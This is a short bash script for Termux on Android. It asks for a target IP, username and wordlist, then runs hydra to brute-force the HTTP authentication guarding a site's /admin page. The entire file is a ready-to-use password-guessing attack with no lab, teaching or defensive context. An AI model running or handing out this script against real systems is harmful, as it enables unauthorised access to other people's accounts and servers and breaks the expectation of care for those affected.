#!/data/data/com.termux/files/usr/bin/bash
read -p "Enter target IP: " ip
read -p "Enter username: " user
read -p "Enter path to wordlist: " wordlist
hydra -l $user -P $wordlist $ip http-get /admin
